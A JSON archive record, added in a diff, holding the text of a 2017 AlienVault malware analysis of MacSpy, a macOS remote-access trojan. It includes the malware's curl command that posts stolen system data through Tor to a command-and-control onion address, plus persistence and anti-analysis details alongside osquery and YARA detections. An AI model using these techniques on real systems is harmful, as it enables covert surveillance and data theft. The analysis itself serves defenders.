@@ -1,0 +1,64 @@
+{
+    "id": "4e2b2c87-714e-46d6-958a-61e647a7bd1d",
+    "created_at": "2023-01-12T15:00:03.259017Z",
+    "updated_at": "2025-03-27T02:09:29.645105Z",
+    "deleted_at": null,
+    "sha1_hash": "5e162cd5ff7ef0dac7225c2846a28def62aba4b5",
+    "title": "2017-06-09 - MacSpy- OS X Mac RAT as a Service",
+    "authors": "",
+    "file_creation_date": "2022-05-28T00:30:57Z",
+    "file_modification_date": "2022-05-28T00:30:57Z",
+    "file_size": 1993887,
+    "plain_text": "# MacSpy: OS X Mac RAT as a Service\n\n**[alienvault.com/blogs/labs-research/macspy-os-x-rat-as-a-service](https://www.alienvault.com/blogs/labs-research/macspy-os-x-rat-as-a-service)**\n\n[1. AT&T Cybersecurity](https://cybersecurity.att.com/)\n[2. Blog](https://cybersecurity.att.com/blogs)\n\nJune 9, 2017 | [Peter Ewane](https://www.alienvault.com/blogs/author/peter-ewane)\nMacSpy is advertised as the \"most sophisticated Mac spyware ever”, with the low starting\nprice of free. While the idea of malware-as-a-service (MaaS) isn’t a new one with players\nsuch as [Tox and Shark the game, it can be said that MacSpy is one of the first seen for the](https://securingtomorrow.mcafee.com/mcafee-labs/meet-tox-ransomware-for-the-rest-of-us/)\nOS X platform.\n\nThe authors state that they created this malware due to Apple products gaining popularity in\nthe recent years. They also state that during their tenure in the field that they have noticed a\nlack of \"sophisticated malware for Mac users\" and they believe that \"people were in need of\nsuch programs on MacOS\". So they created MacSpy. The MacSpy authors claim to have the\nfollowing features in the free version of their RAT:\n\n\n-----\n\nIf you are willing to pay an unknown amount of bitcoins for the advanced version, the\nmalware authors advertise the following features:\n\nMacSpy is not as polished as some of the malware-as-a-service providers out there, as there\ndoesn’t seem to be any customer facing automated service of signing up for their service. In\norder to receive a copy of MacSpy we had to email the author our preferred username and\npassword, in order for them to make us an account. After confirming our details they created\nan account for us, and delivered a zipped file and the following instructions:\n\n\n-----\n\n## Initial Analysis\n\nAfter unzipping the archive we observed it contained the following files:\n\nThe archive contains four files:\n\nMach-O 64-bit executable called 'updated'\nMach-O 64-bit executable called 'webkitproxy'\nMach-O 64-bit dynamically linked shared library called 'libevent-2.0.5.dylib'\nConfig file\n\nAfter examining webkitproxy and libevent-2.0.5.dylib, we noted they are signed by Tor, and\nthus we concluded that they are related to the function of Tor Onion routing. The contents of\nthe config file further convince us of our suspicions are correct:\n\n### Config Contents\n\n\n-----\n\n```\nSOCKSPort 47905 KeepAliveIsolateSOCKSAuth OnionTrafficOnly\nDataDirectory proxyData\nAvoidDiskWrites 1\nControlPort 47906\nMaxCircuitDirtiness 7200\nEnforceDistinctSubnets 0\nHidServAuth .onion\n\n```\nThe \"updated\" file, on the other hand is not digitally signed, and it is currently completely\nundetected by various AV companies on VirusTotal.\n\n## Anti-Analysis\n\nMacSpy has several countermeasures that hamper analysis efforts. To prevent debugging, it\ncalls ptrace() with the PT_DENY_ATTACH option. This is a common anti-debugger check\nand will prevent debuggers from attaching to the process.\n\n\n-----\n\nIf you bypass the ptrace countermeasure, MacSpy has additional code that checks if it is\nrunning in a debugger.\n\n[The code above is very similar to the debugger checking code from this Stack Overflow post.](https://stackoverflow.com/questions/4744826/detecting-if-ios-app-is-run-in-debugger)\n\n\n-----\n\nIn addition to the anti-debugging countermeasures, MacSpy contains checks against the\nexecution environment that can make it difficult to run in a virtual machine. In the code below,\nyou can see that MacSpy checks that the number of physical CPUs is greater than 1, the\nnumber of logical cores is greater than 3, and the number of logical cores is twice the\nnumber of physical cores. MacSpy also checks that there is at least 4 GB of memory on the\nhost. Since malware sandboxes often run with minimal resources, these checks can prevent\nproper execution in virtual environments.\n\n\n-----\n\n[Similar to MacRansom, MacSpy also compares the machine model to \"Mac\" using the](https://blog.fortinet.com/2017/06/09/macransom-offered-as-ransomware-as-a-service)\n'sysctl' command. MacSpy will kill all Terminal windows which can be annoying to analysts\n[using command line tools to analyze the malware (OSX/Dok exhibits similar behavior by](https://objective-see.com/blog/blog_0x1F.html)\nkilling Terminal windows).\n\n## Persistence\n\nIn order to persist on the system the malware creates a launch entry in\n~/Library/LaunchAgents/com.apple.webkit.plist. This ensures that the malware will run at\nstart up to continue collecting information.\n```\n    Label\n    com.apple.webkit\n    Program\n    /Users//Library/.DS_Stores/updated\n    ProgramArguments\n      daemon\n    RunAtLoad\n    KeepAlive\n\n## Behavior Analysis:\n\n```\nUpon execution, successfully passing the anti-analysis checks and setting persistence, the\nmalware then copies itself and associated files from the original point of execution to\n\"~/Library/.DS_Stores/\" and deletes the original files in an attempt to stay hidden from the\nuser. The malware then checks the functionality of its tor proxy by utilizing the curl command\nto contact the command and control server. After connecting to the CnC, the malware sends\nthe data it had collected earlier, such as system information, by sending POST requests\nthrough the TOR proxy. This process repeats again for the various data the malware has\ncollected. After exfiltration of the data, the malware deletes the temporary files containing the\ndata it sent.\n\n\n-----\n\nThe following curl command used to exfiltrate data:\n```\n/usr/bin/curl --fail -m 25 --socks5-hostname 127.0.0.1:47905 -ks -X POST -H key: -H\ntype:system -H Content-Type:multipart/form-data -F\nsystem=@'/Users//Library/.DS_Stores/data/tmp/SystemInfo' http://.onion/upload\n\n```\nContents of ~/Library/.DS_Stores/data/tmp/SystemInfo\n```\nfullUsername      \nusername      \nhostname      ’s Mac mini\nos       Version 10.11.6 (Build 15G1510)\ntimezone      Europe/Zurich\nlanguages      en,de\nmemory       4096\nprocessorCount     2\nsystemUptime      19052.138692271\nfireWall      0\nip       \nmm       false\nroot        /Users//Library/.DS_Stores\nidentifier     Macmini6,1\nuuid        \n/dev/disk0 (internal, physical):\n  #:            TYPE NAME          SIZE    IDENTIFIER\n  0:   GUID_partition_scheme            *500.1 GB  disk0\n  1:            EFI EFI           209.7 MB  disk0s1\n  2:         Apple_HFS Macintosh HD      499.2 GB  disk0s2\n  3:         Apple_Boot Recovery HD       650.0 MB  disk0s3\n\n## User Web Portal\n\n```\nIn our initial email to the malware authors we sent a set of credentials that we wanted to use\nin their web portal. After logging into the MacSpy web portal you are greeted with a very bare\nbones directory listing containing a folder labeled the most recent date of the malware\nexecuting on a system in the YYYYMM format, followed by a folder in the DD format. Diving\ninto that folder you're treated with a series of directories similar to that of the directory\nnaming on the victim system. Inside these folders is the data that was collected from the\nvictim the malware was executed on.\n\n\n-----\n\n## Detection\n\n### NIDS\n\nThe best way to detect MacSpy running on a Mac is to use a combination of Network IDS\n(NIDS) rules as it communicates. As it turns out, AlienVault provides this rule in its threat\nintelligence, which has already been updated with a rule called 'System Compromise,\nMalware RAT, MacSpy'. This feeds into the USM correlation engine to generate an alarm that\nwill notify AlienVault customers that one of their systems is compromised.\n\n### Osquery\n```\n{\n \"platform\": \"darwin\",\n \"version\": \"1.4.5\",\n \"queries\": {\n  \"MacSpy_Launch\":{\n     \"query\":\"select * from launchd where name = 'com.apple.webkit.plist';\",\n     \"interval\":\"3600\",\n     \"description”:\"MacSpy Launch Agent\",\n     \"value\":\"Artifact used by this malware\"\n   }\n  }\n}\n\n Yara\n\n```\nYou can use the rule below in any system that supports Yara to detect this Mac-based\nmalware.\n\n\n-----\n\n```\nrule macSpy\n{\n  meta:\n    author = \"AlienVault Labs\"\n    type = \"malware\"\n    description = \"MacSpy\"\n  strings:\n  $header0 = {cf fa ed fe}\n  $header1 = {ce fa ed fe}\n  $header2 = {ca fe ba be}\n  $c1 = { 76 31 09 00 76 32 09 00 76 33 09 00 69 31 09 00 69 32 09 00 69 33 09 00\n69 34 09 00 66 31 09 00 66 32 09 00 66 33 09 00 66 34 09 00 74 63 3A 00 }\n  condition:\n    ($header0 at 0 or $header1 at 0 or $header2 at 0) and $c1\n}\n\n## Conclusion\n\n```\nPeople generally assume when they are using Macs they are relatively safe from malware.\nThis has been a generally true statement, but this belief is becoming less and less true by\n[the day, as evidenced by the increasing diversity in mac malware along with this name](https://www.alienvault.com/blogs/labs-research/diversity-in-recent-mac-malware)\nfamily. While this piece of Mac malware may not be the most stealthy program, it is feature\nrich and it goes to show that as OS X continues to grow in market share and we can expect\nmalware authors to invest greater amounts of time in producing malware for this platform.\n\nIf you want to find out more about this malware, here is a pulse we have in the AlienVault\nOpen Threat Exchange (OTX):\n\n## Appendix:\n\n6c03e4a9bcb9afaedb7451a33c214ae4\nc72de549a1e72cfff928e8d2591d7e97\ncc07ab42070922b760b6bf9f894d0290\n27056cabd185e939195d1aaa2aa1030f\nf38977a34b1f6d8592fa17fafdb76c59\n\n### Share this with others\n\nTags: [macosx,](https://www.alienvault.com/blogs/tag/macosx) [rat,](https://www.alienvault.com/blogs/tag/rat) [macspy](https://www.alienvault.com/blogs/tag/macspy)\n\n\n-----",
+    "language": "EN",
+    "sources": [
+        {
+            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
+            "created_at": "2023-01-12T14:38:44.599904Z",
+            "updated_at": "2023-01-12T14:38:44.599904Z",
+            "deleted_at": null,
+            "name": "VXUG",
+            "url": "https://www.vx-underground.org",
+            "description": "vx-underground Papers",
+            "reports": null
+        }
+    ],
+    "references": [
+        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2017/2017-06-09 - MacSpy- OS X Mac RAT as a Service.pdf"
+    ],
+    "report_names": [
+        "2017-06-09 - MacSpy- OS X Mac RAT as a Service.pdf"
+    ],
+    "threat_actors": [
+        {
+            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
+            "created_at": "2022-10-25T16:07:24.139848Z",
+            "updated_at": "2025-03-27T02:02:10.120505Z",
+            "deleted_at": null,
+            "main_name": "Safe",
+            "aliases": [],
+            "source_name": "ETDA:Safe",
+            "tools": [
+                "DebugView",
+                "LZ77",
+                "OpenDoc",
+                "SafeDisk",
+                "TypeConfig",
+                "UPXShell",
+                "UsbDoc",
+                "UsbExe"
+            ],
+            "source_id": "ETDA",
+            "reports": null
+        }
+    ],
+    "ts_created_at": 1673535603,
+    "ts_updated_at": 1743041369,
+    "ts_creation_date": 1653697857,
+    "ts_modification_date": 1653697857,
+    "files": {
+        "pdf": "https://archive.orkl.eu/5e162cd5ff7ef0dac7225c2846a28def62aba4b5.pdf",
+        "text": "https://archive.orkl.eu/5e162cd5ff7ef0dac7225c2846a28def62aba4b5.txt",
+        "img": "https://archive.orkl.eu/5e162cd5ff7ef0dac7225c2846a28def62aba4b5.jpg"
+    }
+}
